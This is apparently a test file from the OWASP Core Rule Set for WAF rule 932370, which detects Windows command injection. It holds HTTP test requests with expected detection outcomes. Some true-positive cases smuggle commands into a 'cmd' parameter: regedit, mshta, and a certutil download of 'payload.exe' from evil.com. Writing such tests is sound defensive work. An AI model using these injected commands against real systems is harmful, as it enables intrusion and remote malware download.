---
meta:
  author: "airween, Franziska Bühler, azurit, Esad Cetiner"
  description: "Remote Command Execution: Windows Command Injection test cases"
rule_id: 932370
tests:
  - test_id: 1
    desc: "Windows Command Injection true positive test"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
            Host: "localhost"
            User-Agent: "OWASP CRS test agent"
          method: GET
          port: 80
          # "cmd=; regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey"
          uri: "/get?cmd%3D%3B%20regedit%20%2FE%20c%3A%5Cads%5Cfile.txt%3Aregfile.reg%20HKEY_CURRENT_USER%5CMyCustomRegKey"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932370]
  - test_id: 2
    desc: "Windows Command Injection true negative test"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
            Host: "localhost"
            User-Agent: "OWASP CRS test agent"
          method: GET
          port: 80
          # "cmd=regedit "
          uri: "/get?cmd=regedit%20"
          version: HTTP/1.1
        output:
          log:
            no_expect_ids: [932370]
  - test_id: 3
    desc: "Windows Command Injection - bypass test"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
            Host: "localhost"
            User-Agent: "OWASP CRS test agent"
          method: GET
          port: 80
          # "cmd=; mshta http://example.com"
          uri: "/get?cmd=;%20mshta%20http://example.com"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932370]
  - test_id: 4
    desc: Windows Command Injection bypass with time negative test
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Accept-Encoding: gzip, deflate, br
            Accept-Language: en-us,en;q=0.5
          method: GET
          port: 80
          uri: "/get?foo=time+warner+"
          version: HTTP/1.1
        output:
          log:
            no_expect_ids: [932370]
  - test_id: 5
    desc: "False positive: matching `at` after newline"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
            Host: "localhost"
            User-Agent: "OWASP CRS test agent"
          method: GET
          port: 80
          uri: "/get?cmd=Go%20to%20store.%0AAt%20the%20store%2C%20shop."
          version: HTTP/1.1
        output:
          log:
            no_expect_ids: [932370]
  - test_id: 6
    desc: "False positive: 'url' as a parameter name should not trigger"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
            Host: "localhost"
            User-Agent: "OWASP CRS test agent"
          method: GET
          port: 80
          uri: "/page?url=https://example.com"
          version: HTTP/1.1
        output:
          log:
            no_expect_ids: [932370]
  - test_id: 7
    desc: "Windows Command Injection with certutil"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
            Host: "localhost"
            User-Agent: "OWASP CRS test agent"
          method: GET
          port: 80
          # "cmd=; certutil -urlcache -f http://evil.com/payload.exe"
          uri: "/get?cmd=%3B%20certutil%20-urlcache%20-f%20http%3A%2F%2Fevil.com%2Fpayload.exe"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932370]
